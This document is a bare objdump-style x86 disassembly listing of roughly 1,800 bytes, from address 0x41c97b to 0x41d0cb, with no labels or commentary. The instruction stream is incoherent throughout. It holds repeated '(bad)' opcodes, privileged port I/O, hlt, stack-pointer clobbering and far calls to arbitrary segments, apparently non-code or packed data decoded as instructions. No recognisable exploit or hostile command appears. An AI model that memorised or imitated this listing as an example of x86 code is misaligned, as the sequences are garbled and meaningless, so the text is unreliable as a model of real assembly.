  41c97b:	fs ret 0xb67f
  41c97f:	popf   
  41c980:	nop
  41c981:	or     al,0x18
  41c983:	outs   dx,DWORD PTR ds:[esi]
  41c984:	xor    BYTE PTR [ebx+0x77],0x6b
  41c988:	jecxz  0x41c99c
  41c98a:	(bad)  
  41c98b:	mov    al,ds:0x333723ba
  41c990:	neg    cl
  41c992:	mov    ebp,0x4520bb20
  41c997:	stc    
  41c998:	rol    edi,1
  41c99a:	outs   dx,BYTE PTR ds:[esi]
  41c99b:	sub    BYTE PTR [esi+ebp*4-0x21cbd252],cl
  41c9a2:	add    DWORD PTR [ebx],ecx
  41c9a4:	jb     0x41c957
  41c9a6:	push   es
  41c9a7:	push   ecx
  41c9a8:	push   edx
  41c9a9:	lea    ebp,[eax-0x1dc02b8]
  41c9af:	in     al,0x82
  41c9b1:	in     eax,dx
  41c9b2:	jge    0x41c9e1
  41c9b4:	jo     0x41c94e
  41c9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9b7:	inc    edx
  41c9b8:	(bad)  
  41c9ba:	inc    ebp
  41c9bb:	in     eax,0x8c
  41c9bd:	into   
  41c9be:	sti    
  41c9bf:	dec    si
  41c9c1:	adc    edx,DWORD PTR [esi]
  41c9c3:	cld    
  41c9c4:	aad    0xbb
  41c9c6:	and    ebx,DWORD PTR [ebx+ecx*2+0x7f]
  41c9ca:	sub    bl,BYTE PTR [esi+eax*8-0x3d64bba2]
  41c9d1:	ffree  st(7)
  41c9d3:	jb     0x41ca33
  41c9d5:	inc    edx
  41c9d6:	es iret 
  41c9d8:	cmp    eax,0x8e5a416a
  41c9dd:	ins    BYTE PTR es:[edi],dx
  41c9de:	pop    ebx
  41c9df:	mov    esi,0xe1477749
  41c9e4:	pop    eax
  41c9e5:	mov    ds:0x85877da9,al
  41c9ea:	xchg   edi,eax
  41c9eb:	jp     0x41ca0b
  41c9ed:	adc    DWORD PTR [ecx],eax
  41c9ef:	test   BYTE PTR [ecx-0x49],ch
  41c9f2:	mov    eax,ds:0x58f3b38a
  41c9f7:	pop    ebp
  41c9f8:	add    BYTE PTR [ebp+0x30f3b542],cl
  41c9fe:	iret   
  41c9ff:	leave  
  41ca00:	shr    BYTE PTR [edx-0x736d2524],0xcc
  41ca07:	xlat   BYTE PTR ds:[ebx]
  41ca08:	dec    ecx
  41ca09:	js     0x41c9ef
  41ca0b:	push   ss
  41ca0c:	cmp    al,0x79
  41ca0e:	and    esi,DWORD PTR [edx+eax*1]
  41ca11:	sub    al,BYTE PTR [esi-0x7434c73a]
  41ca17:	(bad)  
  41ca18:	jne    0x41ca52
  41ca1a:	in     al,0x48
  41ca1c:	sub    esp,esp
  41ca1e:	mov    dl,0x7c
  41ca20:	ja     0x41ca29
  41ca22:	cmp    al,0x2d
  41ca24:	xchg   edx,eax
  41ca25:	push   ss
  41ca26:	jbe    0x41c9e3
  41ca28:	pop    eax
  41ca29:	out    dx,al
  41ca2a:	inc    edx
  41ca2b:	xchg   edx,eax
  41ca2c:	(bad)
  41ca30:	pop    esi
  41ca31:	xlat   BYTE PTR ds:[ebx]
  41ca32:	adc    BYTE PTR ds:0x20794ce4,bh
  41ca38:	hlt    
  41ca39:	xchg   ecx,eax
  41ca3a:	adc    cl,BYTE PTR [eax+0x67]
  41ca3d:	das    
  41ca3e:	dec    ecx
  41ca3f:	dec    ecx
  41ca40:	gs and bl,cl
  41ca43:	addr16 dec esi
  41ca45:	jns    0x41c9df
  41ca47:	icebp  
  41ca48:	scas   al,BYTE PTR es:[edi]
  41ca49:	mov    dl,0x48
  41ca4b:	inc    esi
  41ca4c:	leave  
  41ca4d:	shl    DWORD PTR [edx-0x252f9153],cl
  41ca53:	fcomp  QWORD PTR [edi+0x45]
  41ca56:	xor    BYTE PTR [ebx+ecx*8],dh
  41ca59:	mov    bp,0x27f8
  41ca5d:	mov    esp,0x761e1890
  41ca62:	adc    al,0x61
  41ca64:	sbb    al,0x1
  41ca66:	jae    0x41ca8c
  41ca68:	mov    al,ds:0x9dfa2312
  41ca6d:	add    bl,BYTE PTR [edi-0xf]
  41ca70:	sub    DWORD PTR [eax+ecx*2-0x26],edi
  41ca74:	mov    cl,0x9c
  41ca76:	fild   DWORD PTR [eax+0x18a61a0e]
  41ca7c:	add    edi,DWORD PTR [ebx-0x4f]
  41ca7f:	retf   
  41ca80:	sbb    dh,BYTE PTR [eax]
  41ca82:	int    0x22
  41ca84:	push   0xffffffd2
  41ca86:	xchg   esp,eax
  41ca87:	dec    edx
  41ca88:	shr    dl,0x60
  41ca8b:	cmp    al,0x5f
  41ca8d:	push   esi
  41ca8e:	inc    edi
  41ca8f:	popf   
  41ca90:	jno    0x41ca96
  41ca92:	(bad)  
  41ca94:	pop    ebx
  41ca95:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41ca97:	inc    edx
  41ca98:	out    0xe1,al
  41ca9a:	mov    dh,0xe1
  41ca9c:	pushf  
  41ca9d:	mov    edx,DWORD PTR [ebx+0x186cc790]
  41caa3:	sub    BYTE PTR [edx],al
  41caa5:	repnz cdq 
  41caa7:	mov    WORD PTR [esi+eax*2+0x31],?
  41caab:	dec    edx
  41caac:	or     DWORD PTR [ebx],ebx
  41caae:	outs   dx,DWORD PTR ds:[esi]
  41caaf:	jl     0x41cafe
  41cab1:	sub    al,0x96
  41cab3:	xor    eax,0xef242cf6
  41cab8:	push   cs
  41cab9:	and    bl,cl
  41cabb:	ss dec edx
  41cabd:	bound  esi,QWORD PTR [esi+0x53]
  41cac0:	les    ebx,FWORD PTR [edx+edx*8]
  41cac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac4:	jo     0x41cae4
  41cac6:	mul    BYTE PTR [eax+ebp*4-0x32]
  41caca:	fisttp DWORD PTR [ebx+0x7d78a253]
  41cad0:	sub    esp,ebp
  41cad2:	int3   
  41cad3:	sbb    DWORD PTR [ecx+ebx*2],esi
  41cad6:	push   ss
  41cad7:	sbb    ch,bh
  41cad9:	push   ecx
  41cada:	cmc    
  41cadb:	push   esp
  41cadc:	pop    eax
  41cadd:	mov    eax,ds:0xd583a5f4
  41cae2:	cli    
  41cae3:	mov    dl,0x9d
  41cae5:	repnz adc esp,DWORD PTR [edx+edi*4-0x484ec79f]
  41caed:	popa   
  41caee:	fwait
  41caef:	inc    edx
  41caf0:	shr    BYTE PTR [ecx+0x63],1
  41caf3:	cmp    DWORD PTR [ebp-0xa9c9260],esi
  41caf9:	pushf  
  41cafa:	aas    
  41cafb:	jmp    DWORD PTR [edi]
  41cafd:	sbb    eax,0xe6bf4430
  41cb02:	lods   eax,DWORD PTR ds:[esi]
  41cb03:	push   es
  41cb04:	cld    
  41cb05:	ja     0x41cb74
  41cb07:	adc    DWORD PTR [edx],esi
  41cb09:	xchg   edx,eax
  41cb0a:	xor    eax,0xa75b9f0b
  41cb0f:	pushf  
  41cb10:	mov    ds:0xd02f3d00,al
  41cb15:	xor    DWORD PTR [edi+0x2c],ebx
  41cb18:	or     al,0x2a
  41cb1a:	test   BYTE PTR [ebx+0x47],cl
  41cb1d:	pop    edx
  41cb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb20:	inc    edi
  41cb21:	out    dx,al
  41cb22:	(bad)  
  41cb23:	and    DWORD PTR [esi+eax*4+0x48f78214],edi
  41cb2a:	data16 fisubr DWORD PTR [edx+0xc2ca63]
  41cb31:	leave  
  41cb32:	push   ds
  41cb33:	jbe    0x41cae0
  41cb35:	jl     0x41cb7e
  41cb37:	data16 (bad) 
  41cb39:	sub    cl,BYTE PTR [ecx]
  41cb3b:	fwait
  41cb3c:	pop    ebp
  41cb3d:	outs   dx,BYTE PTR ds:[esi]
  41cb3e:	outs   dx,BYTE PTR ds:[esi]
  41cb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb40:	fdivr  st(2),st
  41cb42:	iret   
  41cb43:	sbb    eax,0x5a11846b
  41cb48:	sub    DWORD PTR [esi-0x192673a7],ebx
  41cb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4f:	mov    esi,0xe2d3c8bc
  41cb55:	test   BYTE PTR [edi+0x9],al
  41cb58:	add    BYTE PTR [ecx-0x66],ch
  41cb5b:	push   0x9ee58d6a
  41cb60:	sub    BYTE PTR [esi-0x3d],0xdf
  41cb64:	and    BYTE PTR [ecx],bl
  41cb66:	jbe    0x41cb8d
  41cb68:	es sbb esi,edx
  41cb6b:	mov    ebx,0x71ef76ec
  41cb70:	cwde   
  41cb71:	mov    edx,0x85201b95
  41cb76:	xchg   ecx,eax
  41cb77:	(bad)  
  41cb78:	mov    dl,0x48
  41cb7a:	push   es
  41cb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb7c:	jmp    0x49602121
  41cb81:	ja     0x41cbe3
  41cb83:	and    eax,0x9e2c36b4
  41cb88:	jns    0x41cc00
  41cb8a:	and    al,0xa2
  41cb8c:	xchg   ecx,eax
  41cb8d:	pop    es
  41cb8e:	mov    ds:0x23afcc40,eax
  41cb93:	mov    cl,0x79
  41cb95:	imul   edi,DWORD PTR [ebx+0x70ef5b8b],0x35
  41cb9c:	rol    DWORD PTR [edi-0x165fa216],0x1
  41cba3:	inc    ebp
  41cba4:	mov    ebp,0xf4d41eb0
  41cba9:	loop   0x41cb71
  41cbab:	and    cl,BYTE PTR [edi-0x24]
  41cbae:	mov    eax,0x401b6003
  41cbb3:	push   edi
  41cbb4:	aad    0xd0
  41cbb6:	mov    bh,0xe1
  41cbb8:	and    BYTE PTR [ebx-0x5e65a854],ch
  41cbbe:	loope  0x41cb5a
  41cbc0:	add    edi,DWORD PTR [ebx+0x3a]
  41cbc3:	cli    
  41cbc4:	les    edx,FWORD PTR [ebx-0x496cbe46]
  41cbca:	js     0x41cbd1
  41cbcc:	mov    ecx,0x7c139b5
  41cbd1:	ficomp WORD PTR [eax+0x7]
  41cbd4:	(bad)  
  41cbd6:	(bad)  
  41cbd8:	or     esp,ebx
  41cbda:	lock lahf 
  41cbdc:	and    edx,DWORD PTR [edx+0x90a6c97]
  41cbe2:	push   esp
  41cbe3:	mov    ebp,DWORD PTR [esp+eax*2-0x43255d71]
  41cbea:	dec    ebp
  41cbeb:	dec    ecx
  41cbec:	imul   ebx,DWORD PTR [ecx-0x6b61834a],0xbf676107
  41cbf6:	jge    0x41cc1c
  41cbf8:	sub    esp,ecx
  41cbfa:	mov    ebx,0x14d457d0
  41cbff:	inc    eax
  41cc00:	cmp    al,0x68
  41cc02:	jnp    0x41cc7c
  41cc04:	sbb    DWORD PTR [esi+0x70],esi
  41cc07:	stos   BYTE PTR es:[edi],al
  41cc08:	xchg   cx,ax
  41cc0a:	xchg   ebp,eax
  41cc0b:	jbe    0x41cc75
  41cc0d:	jl     0x41cbc3
  41cc0f:	add    eax,0xee5d74d8
  41cc14:	xchg   ecx,eax
  41cc15:	dec    esi
  41cc16:	jg     0x41cba6
  41cc18:	sbb    eax,0x956e275c
  41cc1d:	mov    dh,0x12
  41cc1f:	gs jge 0x41cc6b
  41cc22:	xchg   esi,eax
  41cc23:	fdivrp st(3),st
  41cc25:	or     edi,DWORD PTR [ebx+0x6bbaf92f]
  41cc2b:	hlt    
  41cc2c:	xor    DWORD PTR ds:0x643909a4,esi
  41cc32:	sbb    ah,BYTE PTR [ebx]
  41cc34:	dec    ebx
  41cc35:	cmp    ebp,DWORD PTR [ebx]
  41cc37:	popf   
  41cc38:	mov    bl,0x1a
  41cc3a:	mov    DWORD PTR [esi-0x34e97008],eax
  41cc40:	add    eax,0x3a4c0eab
  41cc45:	adc    al,0x11
  41cc47:	cmp    ch,cl
  41cc49:	popf   
  41cc4a:	jns    0x41cc8b
  41cc4c:	out    0x8a,eax
  41cc4e:	jne    0x41cbd7
  41cc50:	repz push edx
  41cc52:	loop   0x41cc68
  41cc54:	rol    BYTE PTR [ebx-0x9],cl
  41cc57:	outs   dx,DWORD PTR ds:[esi]
  41cc58:	mov    edx,0x96984e7f
  41cc5d:	(bad)  
  41cc5e:	jnp    0x41cc25
  41cc60:	jb     0x41cc4d
  41cc62:	mov    esi,0x7a231fca
  41cc67:	pop    esp
  41cc68:	xchg   BYTE PTR [eax],cl
  41cc6a:	mov    dh,0x35
  41cc6c:	mov    BYTE PTR [ebx-0x2d],cl
  41cc6f:	fcmovbe st,st(0)
  41cc71:	xchg   ecx,eax
  41cc72:	scas   eax,DWORD PTR es:[edi]
  41cc73:	push   edx
  41cc74:	xchg   ebp,eax
  41cc75:	cmp    eax,DWORD PTR [esi]
  41cc77:	xor    al,0x77
  41cc79:	enter  0x5b18,0xea
  41cc7d:	shl    ch,1
  41cc7f:	lds    edx,FWORD PTR [eax-0xd]
  41cc82:	mov    eax,0x640dcdd3
  41cc87:	call   0xe1a0:0xa9bbce16
  41cc8e:	call   0xe908:0x4c95bea9
  41cc95:	dec    ebx
  41cc96:	cdq    
  41cc97:	xchg   ebx,eax
  41cc98:	sub    al,0x5f
  41cc9a:	mov    DWORD PTR [ebp+0x5e],ecx
  41cc9d:	retf   0xb503
  41cca0:	test   eax,0x8869b5e8
  41cca5:	sbb    bl,al
  41cca7:	stos   DWORD PTR es:[edi],eax
  41cca8:	mov    ah,BYTE PTR [eax-0x60794338]
  41ccae:	inc    esp
  41ccaf:	fiadd  WORD PTR [esi-0x57]
  41ccb2:	fbld   TBYTE PTR [ebp+0xf]
  41ccb5:	mov    edx,0x27c6779
  41ccba:	jbe    0x41cc6e
  41ccbc:	or     al,0xda
  41ccbe:	xchg   ecx,eax
  41ccbf:	adc    ah,al
  41ccc1:	shl    DWORD PTR [ebp-0x6f],0x49
  41ccc5:	sti    
  41ccc6:	inc    edi
  41ccc7:	pop    esp
  41ccc8:	push   edx
  41ccc9:	add    eax,0x7cd7ff0e
  41ccce:	push   0x7e95d404
  41ccd3:	fsub   DWORD PTR ds:0x5d019e45
  41ccd9:	in     al,0x17
  41ccdb:	out    0xec,eax
  41ccdd:	pop    esp
  41ccde:	inc    esi
  41ccdf:	ja     0x41cd2b
  41cce1:	loope  0x41cc6d
  41cce3:	sbb    esi,0xdc612a95
  41cce9:	mov    esi,0xe9aa751e
  41ccee:	or     ch,0xd3
  41ccf1:	mov    esp,0x8e3976d1
  41ccf6:	sbb    DWORD PTR [eax],esp
  41ccf8:	adc    BYTE PTR ds:0x945c48b5,ch
  41ccfe:	pop    ss
  41ccff:	pusha  
  41cd00:	sbb    ebx,DWORD PTR [ebx-0x760785f2]
  41cd06:	fwait
  41cd07:	mov    cl,0xe7
  41cd09:	in     eax,dx
  41cd0a:	jmp    0x38b1b417
  41cd0f:	cmc    
  41cd10:	addr16 enter 0x840a,0x17
  41cd15:	push   esp
  41cd16:	push   ebp
  41cd17:	inc    ebx
  41cd18:	or     al,0xcb
  41cd1a:	push   es
  41cd1b:	or     DWORD PTR [ebx],0xe0e51a25
  41cd21:	int    0x94
  41cd23:	mov    bl,0x2f
  41cd25:	mov    es,eax
  41cd27:	jmp    0x5343dbcf
  41cd2c:	sbb    DWORD PTR [esi-0x3c],0x63d6b96d
  41cd33:	sub    al,bl
  41cd35:	mov    WORD PTR [edx+0x4f05488c],?
  41cd3b:	les    eax,FWORD PTR [ecx+ebx*1-0x75]
  41cd3f:	xchg   edx,eax
  41cd40:	out    dx,eax
  41cd41:	cs aad 0x81
  41cd44:	or     BYTE PTR [ebp+0x29d464cd],0x3c
  41cd4b:	jge    0x41cd1c
  41cd4d:	lods   al,BYTE PTR ds:[esi]
  41cd4e:	scas   eax,DWORD PTR es:[edi]
  41cd4f:	mov    al,ds:0xa70fb79
  41cd54:	es or  al,0x64
  41cd57:	scas   al,BYTE PTR es:[edi]
  41cd58:	iret   
  41cd59:	cmp    al,0xcd
  41cd5b:	shl    DWORD PTR [eax-0x714c245a],cl
  41cd61:	inc    esi
  41cd62:	mov    ebx,0x55aadfa4
  41cd67:	sub    ebx,DWORD PTR [ebx+edi*1]
  41cd6a:	ss or  al,0x10
  41cd6d:	or     bl,dl
  41cd6f:	ja     0x41cde2
  41cd71:	mov    esi,0x7e8e9a64
  41cd76:	cmp    eax,0xeb06740d
  41cd7b:	dec    eax
  41cd7c:	mov    BYTE PTR [ebx+0x7db47b09],dl
  41cd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd83:	frstor [ebx+ebx*8-0x62db577a]
  41cd8a:	sub    edx,DWORD PTR ds:0x2a64f55f
  41cd90:	mov    WORD PTR [eax-0x1],ss
  41cd93:	sub    eax,0xe6b9f32a
  41cd98:	push   0x48
  41cd9a:	call   0x3744:0x8605922f
  41cda1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cda2:	cmp    bh,BYTE PTR [esi+ebx*2]
  41cda5:	jl     0x41cd53
  41cda7:	gs push eax
  41cda9:	ja     0x41cd4d
  41cdab:	sbb    BYTE PTR [ebx+0x5a3d405c],0x7e
  41cdb2:	sahf   
  41cdb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb4:	imul   esp,DWORD PTR [esi+edx*8-0x2e24dd5a],0xe
  41cdbc:	int3   
  41cdbd:	pop    eax
  41cdbe:	xchg   edi,eax
  41cdbf:	cmp    BYTE PTR [esi+0x3e],dh
  41cdc2:	call   0x821adf0b
  41cdc7:	add    BYTE PTR [ebp-0xf],bh
  41cdca:	or     edi,DWORD PTR [edx]
  41cdcc:	sbb    ebp,eax
  41cdce:	push   esp
  41cdcf:	stc    
  41cdd0:	mov    edx,DWORD PTR [eax-0x5ac1080e]
  41cdd6:	and    edx,DWORD PTR [edi-0xa3586b1]
  41cddc:	out    dx,al
  41cddd:	pop    ss
  41cdde:	jns    0x41cda6
  41cde0:	ficomp DWORD PTR [ebp-0x48253cc5]
  41cde6:	jmp    0x1748:0x81bb5b35
  41cded:	fmulp  st(4),st
  41cdef:	pop    edx
  41cdf0:	cwde   
  41cdf1:	mov    eax,0x5355b887
  41cdf6:	dec    DWORD PTR [eax+edx*2+0x2cf9f44]
  41cdfd:	mov    eax,eax
  41cdff:	das    
  41ce00:	fidiv  WORD PTR ds:0x30ec8410
  41ce06:	iret   
  41ce07:	push   ss
  41ce08:	jecxz  0x41ce25
  41ce0a:	idiv   DWORD PTR [edi]
  41ce0c:	pop    ds
  41ce0d:	mov    bh,0x18
  41ce0f:	dec    esp
  41ce10:	adc    DWORD PTR [esi-0x32],esi
  41ce13:	dec    ebx
  41ce14:	dec    ecx
  41ce15:	xchg   edi,eax
  41ce16:	mov    dh,0xf6
  41ce18:	jecxz  0x41cdb0
  41ce1a:	sbb    al,0x11
  41ce1c:	jle    0x41ce19
  41ce1e:	neg    DWORD PTR [eax]
  41ce20:	call   0x4c45:0x59b3be09
  41ce27:	jnp    0x41cdbd
  41ce29:	out    dx,eax
  41ce2a:	test   al,0xf
  41ce2c:	loop   0x41ce5c
  41ce2e:	hlt    
  41ce2f:	loope  0x41ce1c
  41ce31:	adc    al,0x1e
  41ce33:	xchg   BYTE PTR [edx+eiz*8+0x2d],bl
  41ce37:	pop    ss
  41ce38:	mul    cl
  41ce3a:	inc    ecx
  41ce3b:	pop    edx
  41ce3c:	div    edi
  41ce3e:	mov    WORD PTR [edx-0x4ce25f39],cs
  41ce44:	or     ah,ch
  41ce46:	and    DWORD PTR [edi+0x37cea3a9],edx
  41ce4c:	add    eax,0x66f8ca34
  41ce51:	dec    ebp
  41ce52:	and    dl,BYTE PTR [ecx+0x72c1f70f]
  41ce58:	das    
  41ce59:	mov    ah,0x83
  41ce5b:	mov    DWORD PTR [ebx-0x11],edi
  41ce5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce5f:	inc    esp
  41ce60:	out    dx,al
  41ce61:	dec    edi
  41ce62:	js     0x41ce82
  41ce64:	jle    0x41ce5d
  41ce66:	int3   
  41ce67:	xor    ebp,eax
  41ce69:	mov    ds:0xe0cd861e,eax
  41ce6e:	out    0x29,eax
  41ce70:	pop    es
  41ce71:	cmp    DWORD PTR [esi+ecx*1+0x6dd48a9d],0xd8edf3ed
  41ce7c:	mov    cl,0xf8
  41ce7e:	arpl   WORD PTR [ecx-0x64b216a9],bp
  41ce84:	stos   BYTE PTR es:[edi],al
  41ce85:	inc    ebp
  41ce86:	inc    ebx
  41ce87:	pop    ebp
  41ce88:	sbb    BYTE PTR [ecx+0x27],al
  41ce8b:	loop   0x41ce61
  41ce8d:	cmp    DWORD PTR [edi],0x185dc063
  41ce93:	loop   0x41ced7
  41ce95:	mov    ds:0xb215da14,eax
  41ce9a:	stc    
  41ce9b:	and    bh,BYTE PTR [ebx-0x20]
  41ce9e:	mov    eax,ds:0x5f773cdd
  41cea3:	add    BYTE PTR [ecx],ch
  41cea5:	add    edx,esi
  41cea7:	cld    
  41cea8:	adc    ebp,edi
  41ceaa:	cmp    cl,BYTE PTR [ebp-0x5954d50a]
  41ceb0:	scas   al,BYTE PTR es:[edi]
  41ceb1:	loope  0x41cf14
  41ceb3:	fs pushf 
  41ceb5:	mov    eax,ds:0x9656f72
  41ceba:	(bad)  
  41cebb:	xlat   BYTE PTR ds:[ebx]
  41cebc:	scas   eax,DWORD PTR es:[edi]
  41cebd:	out    0x6c,eax
  41cebf:	xlat   BYTE PTR ds:[ebx]
  41cec0:	jo     0x41ce66
  41cec2:	stos   DWORD PTR es:[edi],eax
  41cec3:	inc    eax
  41cec4:	in     eax,0x56
  41cec6:	adc    al,0x20
  41cec8:	push   0xf6bbf72c
  41cecd:	neg    DWORD PTR [esi]
  41cecf:	push   es
  41ced0:	push   ebp
  41ced1:	nop
  41ced2:	push   edx
  41ced3:	cli    
  41ced4:	dec    eax
  41ced5:	mov    dh,0x3b
  41ced7:	aaa    
  41ced8:	mov    ds:0x72963e88,eax
  41cedd:	in     eax,dx
  41cede:	cmp    ah,BYTE PTR [ebp-0x5696c15e]
  41cee4:	enter  0x855e,0xe1
  41cee8:	test   eax,0xb1aff3db
  41ceed:	adc    BYTE PTR [esi+0x2ae7f0d4],ah
  41cef3:	iret   
  41cef4:	sahf   
  41cef5:	cmp    BYTE PTR [ebp+0x6c],ch
  41cef8:	inc    ebx
  41cef9:	cld    
  41cefa:	out    dx,eax
  41cefb:	ja     0x41cf36
  41cefd:	inc    edx
  41cefe:	xor    al,0xa9
  41cf00:	data16 shl BYTE PTR [ebx+0x27],1
  41cf04:	pop    ds
  41cf05:	xchg   ebp,eax
  41cf06:	mov    dh,0x63
  41cf08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf09:	or     DWORD PTR [esi-0x52],esi
  41cf0c:	xor    edi,esp
  41cf0e:	or     DWORD PTR [edx+0x18f8e7a8],ecx
  41cf14:	shl    BYTE PTR [esi-0x75],1
  41cf17:	mov    dl,0x2e
  41cf19:	dec    ebx
  41cf1a:	retf   
  41cf1b:	push   0x8fbcef00
  41cf20:	mov    ds:0x16e57fd3,eax
  41cf25:	adc    bl,BYTE PTR [edx+edi*4-0x1b]
  41cf29:	add    BYTE PTR [ebp+0x671dd3da],ch
  41cf2f:	push   eax
  41cf30:	mov    al,ds:0x8d80b4b9
  41cf35:	pop    ebx
  41cf36:	push   esi
  41cf37:	mov    ds:0xe61c4728,al
  41cf3c:	jge    0x41cf3e
  41cf3e:	inc    esp
  41cf3f:	or     DWORD PTR [ebx],ebx
  41cf41:	outs   dx,DWORD PTR ds:[esi]
  41cf42:	mov    bl,0x63
  41cf44:	jo     0x41cf52
  41cf46:	jecxz  0x41ceeb
  41cf48:	or     ebx,esi
  41cf4a:	sbb    al,0x70
  41cf4c:	sbb    BYTE PTR [ebx],bl
  41cf4e:	and    al,0x13
  41cf50:	(bad)  
  41cf51:	shr    esp,cl
  41cf53:	or     eax,DWORD PTR [edx+0x76]
  41cf56:	jbe    0x41cf82
  41cf58:	mov    ebx,DWORD PTR [esi+esi*2]
  41cf5b:	icebp  
  41cf5c:	inc    esp
  41cf5d:	mov    cl,0x8
  41cf5f:	jmp    0x41cf05
  41cf61:	clc    
  41cf62:	pop    ebp
  41cf63:	sbb    bl,BYTE PTR [ebx+0x9]
  41cf66:	inc    eax
  41cf67:	fimul  DWORD PTR [edx-0x64]
  41cf6a:	in     al,0x0
  41cf6c:	jl     0x41cf83
  41cf6e:	and    BYTE PTR [si],al
  41cf71:	pop    edx
  41cf72:	fld    DWORD PTR [esp+edi*1-0x1764ff63]
  41cf79:	pusha  
  41cf7a:	mov    esp,0x525f17da
  41cf7f:	xchg   edx,eax
  41cf80:	sub    eax,0xc0ecb190
  41cf85:	aas    
  41cf86:	and    bh,BYTE PTR [ecx+0x7b]
  41cf89:	ret    0x2fb2
  41cf8c:	mov    esi,0x9c5de4a2
  41cf91:	pop    es
  41cf92:	jne    0x41cfba
  41cf94:	jmp    0x79b21b7b
  41cf99:	pop    eax
  41cf9a:	xchg   esi,eax
  41cf9b:	leave  
  41cf9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf9d:	std    
  41cf9e:	mov    DWORD PTR [ebx+0x6efa2bec],edx
  41cfa4:	fiadd  WORD PTR [edx+0x6a]
  41cfa7:	lock add al,0x15
  41cfaa:	shl    DWORD PTR [ebx-0x75],0xeb
  41cfae:	adc    ecx,edi
  41cfb0:	repz add BYTE PTR [ebp+0x5b],0xd8
  41cfb5:	inc    edi
  41cfb6:	inc    ecx
  41cfb7:	pop    esi
  41cfb8:	or     al,0xa3
  41cfba:	out    dx,eax
  41cfbb:	sahf   
  41cfbc:	pop    ebp
  41cfbd:	(bad)  
  41cfbe:	in     al,0x89
  41cfc0:	fwait
  41cfc1:	or     al,0x50
  41cfc3:	sub    al,0x65
  41cfc5:	push   0x9efb27db
  41cfca:	int3   
  41cfcb:	cmp    al,0x64
  41cfcd:	fldcw  WORD PTR [edx-0x43]
  41cfd0:	adc    BYTE PTR [eax+0x91269e9],dl
  41cfd6:	bound  edi,QWORD PTR [edx]
  41cfd8:	push   ss
  41cfd9:	xchg   esp,eax
  41cfda:	(bad)  [eax+0x6a0db569]
  41cfe0:	inc    esi
  41cfe1:	cli    
  41cfe2:	mov    ch,BYTE PTR [edi-0x5a]
  41cfe5:	push   ds
  41cfe6:	mov    DWORD PTR [edx],ecx
  41cfe8:	jl     0x41cfc8
  41cfea:	ja     0x41cfe4
  41cfec:	inc    DWORD PTR [esi]
  41cfee:	push   ecx
  41cfef:	mov    dh,0xd3
  41cff1:	and    eax,0x66fbbbb7
  41cff6:	inc    edi
  41cff7:	hlt    
  41cff8:	mov    esi,0xc33a6aa6
  41cffd:	int    0xf0
  41cfff:	lea    esp,[edi+0x72f11131]
  41d005:	fwait
  41d006:	add    dl,BYTE PTR [edx-0xc17e83f]
  41d00c:	mov    WORD PTR [ebx+edx*4+0x14],es
  41d010:	into   
  41d011:	(bad)  
  41d012:	jle    0x41d00f
  41d014:	cmp    DWORD PTR [ecx],0xbfab5d05
  41d01a:	call   0xe45b:0xabdf1f40
  41d021:	idiv   DWORD PTR [edx-0x48f432f7]
  41d027:	jno    0x41d026
  41d029:	adc    BYTE PTR [ebx-0x2f],al
  41d02c:	dec    eax
  41d02d:	jbe    0x41d09c
  41d02f:	mov    cs,WORD PTR [esp+ecx*2+0x460814de]
  41d036:	xchg   ebx,eax
  41d037:	adc    DWORD PTR [ebx-0x1994265c],ecx
  41d03d:	fstp   TBYTE PTR [edx-0x14dd4cde]
  41d043:	xchg   DWORD PTR [ecx+0x20],ebp
  41d046:	sub    esp,esi
  41d048:	adc    ch,bh
  41d04a:	shl    BYTE PTR [esi+0x10fdac91],1
  41d050:	test   BYTE PTR [eax],0x98
  41d053:	dec    ebp
  41d054:	and    bl,al
  41d056:	cmc    
  41d057:	mov    bh,BYTE PTR [ebp-0x51]
  41d05a:	not    esp
  41d05c:	push   ss
  41d05d:	and    DWORD PTR [esi+0x7c],ecx
  41d060:	xor    eax,0x60982bb4
  41d065:	cmp    BYTE PTR [esp+eax*8-0x2ab0eb5b],bl
  41d06c:	sub    al,bl
  41d06e:	fcmovb st,st(4)
  41d070:	dec    ebp
  41d071:	jno    0x41d0ac
  41d073:	imul   edx,ebx,0xffffffb0
  41d076:	push   eax
  41d077:	mul    DWORD PTR ds:[eax-0x1]
  41d07b:	mov    ah,0xc8
  41d07d:	xor    eax,0x545d6ab6
  41d082:	push   edi
  41d083:	dec    esp
  41d084:	sub    ebp,DWORD PTR [eax-0x19ea4618]
  41d08a:	jge    0x41d0d2
  41d08c:	(bad)  
  41d08d:	(bad)  
  41d08e:	mov    cl,0x3f
  41d090:	push   ebp
  41d091:	mov    ds:0xb9105059,eax
  41d096:	fldenv [edx]
  41d098:	jo     0x41d02c
  41d09a:	push   edi
  41d09b:	sub    BYTE PTR [ebp-0x5116b53d],0xf1
  41d0a2:	pop    ss
  41d0a3:	fdivr  st,st(7)
  41d0a5:	ret    0x176a
  41d0a8:	(bad)
  41d0ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0ac:	sub    DWORD PTR [ecx-0x2f],ebx
  41d0af:	ret    
  41d0b0:	fmul   st,st(1)
  41d0b2:	sbb    ah,BYTE PTR [ebx]
  41d0b4:	jmp    0xb50c1a3f
  41d0b9:	outs   dx,BYTE PTR ds:[esi]
  41d0ba:	push   eax
  41d0bb:	mov    ds,ebx
  41d0bd:	ins    DWORD PTR es:[edi],dx
  41d0be:	pusha  
  41d0bf:	inc    eax
  41d0c0:	aam    0x8d
  41d0c2:	test   DWORD PTR [edx-0x3],edx
  41d0c5:	add    eax,0xb30b9d75
  41d0ca:	pop    eax
  41d0cb:	shl    BYTE PTR [esi],cl
